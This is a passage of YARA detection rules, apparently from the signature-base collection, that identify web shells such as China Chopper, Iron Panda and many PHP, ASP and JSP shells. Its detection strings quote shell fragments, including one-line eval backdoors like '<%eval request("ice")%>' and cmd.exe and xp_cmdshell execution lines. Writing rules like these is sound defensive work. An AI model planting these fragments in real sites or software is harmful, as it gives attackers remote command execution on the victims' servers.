		hash = "f1c95b13a71ca3629a0bb79601fcacf57cdfcf768806a71b26f2448f8c1d5d24"
		logic_hash = "0c4570373d50c40745cd0523dcf8c34ee3cae1c298982b3a39d4a33e054aa779"
		score = 60
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "input type"
		$s1 = "<%eval request"
		$s2 = "<%eval(Request.Item["
		$s3 = "LANGUAGE='VBScript'"
		$s4 = "$_REQUEST" fullword
		$s5 = ";eval("
		$s6 = "base64_decode"
		$fp1 = "<form name=\"social_form\""

	condition:
		uint32(0)==0x38464947 and (1 of ($s*)) and not 1 of ($fp*)
}
rule SIGNATURE_BASE_Ironpanda_Webshell_JSP : FILE {
    meta:
		description = "Iron Panda Malware JSP"
		author = "Florian Roth (Nextron Systems)"
		id = "38125418-7867-5073-a731-4f1d64e07588"
		date = "2015-09-16"
		modified = "2023-12-05"
		reference = "https://goo.gl/E4qia9"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_irontiger.yar#L57-L72"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3be95477e1d9f3877b4355cff3fbcdd3589bb7f6349fd4ba6451e1e9d32b7fa6"
		logic_hash = "747ce812b156bf03f8d14ef84e7d2e8535c7c70590dfcb50ce3e957bec745efc"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Bin_ExecSql(\"exec master..xp_cmdshell'bcp \\\"select safile from \" + db + \"..bin_temp\\\" queryout \\\"\" + Bin_TextBox_SaveP" ascii
		$s2 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('zcg_ClosePM','\"+Bin_ToBase64(de.Key.ToString())+\"')\\\">Close</a>\";" fullword ascii
		$s3 = "Bin_ExecSql(\"IF OBJECT_ID('bin_temp')IS NOT NULL DROP TABLE bin_temp\");" fullword ascii

	condition:
		filesize <330KB and 1 of them
}
rule SIGNATURE_BASE_Webshell_Caterpillar_ASPX {
    meta:
		description = "Volatile Cedar Webshell - from file caterpillar.aspx"
		author = "Florian Roth (Nextron Systems)"
		id = "9af48c64-3768-5765-8245-38df000598a7"
		date = "2015-04-03"
		modified = "2023-12-05"
		reference = "http://goo.gl/emons5"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_volatile_cedar.yar#L106-L126"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "9df2e4a25052136d6e622273f917bd15df410869a8cf3075c773a14ea62a2a55"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "af4c99208fb92dc42bc98c4f96c3536ec8f3fe56"

	strings:
		$s0 = "Dim objNewRequest As WebRequest = HttpWebRequest.Create(sURL)" fullword
		$s1 = "command = \"ipconfig /all\"" fullword
		$s3 = "For Each xfile In mydir.GetFiles()" fullword
		$s6 = "Dim oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword
		$s10 = "recResult = adoConn.Execute(strQuery)" fullword
		$s12 = "b = Request.QueryString(\"src\")" fullword
		$s13 = "rw(\"<a href='\" + link + \"' target='\" + target + \"'>\" + title + \"</a>\")" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Chinachopper_Generic : FILE {
    meta:
		description = "China Chopper Webshells - PHP and ASPX"
		author = "Florian Roth (Nextron Systems)"
		id = "2473cef1-88cf-5b76-a87a-2978e6780b4f"
		date = "2015-03-10"
		modified = "2022-10-27"
		reference = "https://www.fireeye.com/content/dam/legacy/resources/pdfs/fireeye-china-chopper-report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_webshell_chinachopper.yar#L2-L19"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "34cb81b077d6dae5b4565001b2ab28897c6c554f00aa102601fb9c416c6c0f09"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$x_aspx = /%@\sPage\sLanguage=.Jscript.%><%eval\(Request\.Item\[.{,100}unsafe/
		$x_php = /<?php.\@eval\(\$_POST./
		$fp1 = "GET /"
		$fp2 = "POST /"

	condition:
		filesize <300KB and 1 of ($x*) and not 1 of ($fp*)
}
rule SIGNATURE_BASE_Webshell_H4Ntu_Shell_Powered_By_Tsoi_ {
    meta:
		description = "Web Shell - file h4ntu shell powered by tsoi.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L32-L48"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "06ed0b2398f8096f1bebf092d0526137"
		logic_hash = "2f3cfb6d7d5ee6facb18397e3166ab2a7450f05a24fbb25a159a6168ca631a39"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>Server Adress:</b"
		$s3 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>User Info:</b> ui"
		$s4 = "    <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><?= $info ?>: <?= "
		$s5 = "<INPUT TYPE=\"text\" NAME=\"cmd\" value=\"<?php echo stripslashes(htmlentities($"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_PHP_Sql {
    meta:
		description = "Web Shell - file sql.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L49-L63"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "2cf20a207695bbc2311a998d1d795c35"
		logic_hash = "83049c3c5bce88d239b59accb173e234c3169f59187de17b7e6c2a0aa58a552f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$result=mysql_list_tables($db) or die (\"$h_error<b>\".mysql_error().\"</b>$f_"
		$s4 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_PHP_A {
    meta:
		description = "Web Shell - file a.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L64-L79"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e3b461f7464d81f5022419d87315a90d"
		logic_hash = "6bdd5fbe9b16f2d84b884239cf3b6453587933c6b0c4308508d10019b4f36e38"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\""
		$s2 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>"
		$s4 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p> " fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Imhapftp_2 {
    meta:
		description = "Web Shell - file iMHaPFtp.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L80-L94"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "12911b73bc6a5d313b494102abcf5c57"
		logic_hash = "9099504870c1e466808060f11aea38472832846d24e3c84fdd69b7d26bfed69d"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "if ($l) echo '<a href=\"' . $self . '?action=permission&amp;file=' . urlencode($"
		$s9 = "return base64_decode('R0lGODlhEQANAJEDAMwAAP///5mZmf///yH5BAHoAwMALAAAAAARAA0AAA"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Jspspyweb {
    meta:
		description = "Web Shell - file Jspspyweb.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L95-L109"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "4e9be07e95fff820a9299f3fb4ace059"
		logic_hash = "491d9c4efee27469f2a26f6fcb7f7c768eac60977e640096ea5f78ff346e7fbe"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "      out.print(\"<tr><td width='60%'>\"+strCut(convertPath(list[i].getPath()),7"
		$s3 = "  \"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Safe_Mode_Bypass_PHP_4_4_2_And_PHP_5_1_2 {
    meta:
		description = "Web Shell - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L110-L124"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "49ad9117c96419c35987aaa7e2230f63"
		logic_hash = "d3d27d80f5f3adbc050a59d0c25953ec5d634344b5d051a4abdf4eeed3b8b035"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "die(\"\\nWelcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\\n"
		$s1 = "Mode Shell v1.0</font></span></a></font><font face=\"Webdings\" size=\"6\" color"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Simattacker_Vrsion_1_0_0_Priv8_4_My_Friend {
    meta:
		description = "Web Shell - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L125-L139"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "089ff24d978aeff2b4b2869f0c7d38a3"
		logic_hash = "fc553942b06b305f7b0d5b072a8d4517b0e51229545440ea9c43e9be01d64efa"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "echo \"<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><fo"
		$s3 = "fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Phpshell_2_1_Pwhash {
    meta:
		description = "Web Shell - file pwhash.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L140-L154"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ba120abac165a5a30044428fac1970d8"
		logic_hash = "616c0570550cdb9394b5675864d4eec3fa62390f880817406b2a3b63952b69f0"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<tt>&nbsp;</tt>\" (space), \"<tt>[</tt>\" (left bracket), \"<tt>|</tt>\" (pi"
		$s3 = "word: \"<tt>null</tt>\", \"<tt>yes</tt>\", \"<tt>no</tt>\", \"<tt>true</tt>\","

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Phpremoteview {
    meta:
		description = "Web Shell - file PHPRemoteView.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L155-L169"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "29420106d9a81553ef0d1ca72b9934d9"
		logic_hash = "2de48b8640c0f2089a4a0badb4429127cb61ac972459290041e20b959e4e0c05"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
		$s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Jsp_12302 {
    meta:
		description = "Web Shell - file 12302.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L170-L185"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a3930518ea57d899457a62f372205f7f"
		logic_hash = "0959a138abc791f17344e25e84b24888ddfe238981fc7e3ffd76c0390006ea46"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "</font><%out.print(request.getRealPath(request.getServletPath())); %>" fullword
		$s1 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>" fullword
		$s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Caidao_Shell_Guo {
    meta:
		description = "Web Shell - file guo.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L186-L200"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "9e69a8f499c660ee0b4796af14dc08f0"
		logic_hash = "efb7055f42dd6be41ea3983cacea1a70b83675c8ebcb88ae3b250066a29e94eb"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php ($www= $_POST['ice'])!"
		$s1 = "@preg_replace('/ad/e','@'.str_rot13('riny').'($ww"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_PHP_Redcod {
    meta:
		description = "Web Shell - file redcod.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L201-L215"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5c1c8120d82f46ff9d813fbe3354bac5"
		logic_hash = "eddfd90d27793756bcc685ffe33b2dabc3bb28b9654c33a0f99359e8b6f13678"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "H8p0bGFOEy7eAly4h4E4o88LTSVHoAglJ2KLQhUw" fullword
		$s1 = "HKP7dVyCf8cgnWFy8ocjrP5ffzkn9ODroM0/raHm" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Remview_Fix {
    meta:
		description = "Web Shell - file remview_fix.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L216-L230"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a24b7c492f5f00e2a19b0fa2eb9c3697"
		logic_hash = "0b29ef74fb0786aefe99281360dc4fe27005eac345a36bc14259afa6fc555303"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u"
		$s5 = "echo \"<P><hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Asp_Cmd {
    meta:
		description = "Web Shell - file cmd.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L231-L246"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "895ca846858c315a3ff8daa7c55b3119"
		logic_hash = "8e72b54267c2f83b288cdd43ccd56ae4ab1f95c17f4dde077e637d951df54866"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
		$s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
		$s3 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Php_Sh_Server {
    meta:
		description = "Web Shell - file server.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L247-L260"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d87b019e74064aa90e2bb143e5e16cfa"
		logic_hash = "9f4d940a381e7bd298a252f485d5f1d26fd191c27f6e86e8fa6028237592a8c3"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "eval(getenv('HTTP_CODE'));" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_PH_Vayv_PH_Vayv {
    meta:
		description = "Web Shell - file PH Vayv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L261-L275"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "35fb37f3c806718545d97c6559abd262"
		logic_hash = "8769400b7b6828849f27092d790d291721c7e1b39dfd2080de5da8e59dd25523"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px in"
		$s4 = "<font color=\"#858585\">SHOPEN</font></a></font><font face=\"Verdana\" style"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Caidao_Shell_Ice {
    meta:
		description = "Web Shell - file ice.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L276-L289"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "6560b436d3d3bb75e2ef3f032151d139"
		logic_hash = "d92cc9ac8630b40f23b9ff7cda5a237b4885d30de4b9b497be7512e7eb020a09"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%eval request(\"ice\")%>" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Cihshell_Fix {
    meta:
		description = "Web Shell - file cihshell_fix.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L290-L304"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3823ac218032549b86ee7c26f10c4cb5"
		logic_hash = "59ae76d6828d8c0ddcbafa19063e6dcf25c826386f46df2b8f9674b628365a2b"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "<tr style='background:#242424;' ><td style='padding:10px;'><form action='' encty"
		$s8 = "if (isset($_POST['mysqlw_host'])){$dbhost = $_POST['mysqlw_host'];} else {$dbhos"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Asp_Shell {
    meta:
		description = "Web Shell - file shell.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L305-L319"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e63f5a96570e1faf4c7b8ca6df750237"
		logic_hash = "5cc698e4ff23ca296b339589d12c24e67c99272e73445604a4552d3023e19636"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "<input type=\"submit\" name=\"Send\" value=\"GO!\">" fullword
		$s8 = "<TEXTAREA NAME=\"1988\" ROWS=\"18\" COLS=\"78\"></TEXTAREA>" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Private_I3Lue {
    meta:
		description = "Web Shell - file Private-i3lue.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L320-L333"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "13f5c7a035ecce5f9f380967cf9d4e92"
		logic_hash = "274586f2c451eda45c3a52b615961dbba806f8d25e34cc358e661fcfd1143d08"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "case 15: $image .= \"\\21\\0\\"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Php_Up {
    meta:
		description = "Web Shell - file up.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L334-L349"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "7edefb8bd0876c41906f4b39b52cd0ef"
		logic_hash = "22f444ce4068f46c0b57e566faca0c6377346e403de592b0e51869781fda31a9"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "copy($HTTP_POST_FILES['userfile']['tmp_name'], $_POST['remotefile']);" fullword
		$s3 = "if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name'])) {" fullword
		$s8 = "echo \"Uploaded file: \" . $HTTP_POST_FILES['userfile']['name'];" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Mysql_Interface_V1_0 {
    meta:
		description = "Web Shell - file Mysql interface v1.0.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L350-L363"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a12fc0a3d31e2f89727b9678148cd487"
		logic_hash = "baa938c4cfd2c46b1752d866e186d76a04c353617d8ec3e0d78a3c546b120d13"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "echo \"<td><a href='$PHP_SELF?action=dropDB&dbname=$dbname' onClick=\\\"return"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Php_S_U {
    meta:
		description = "Web Shell - file s-u.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L364-L377"
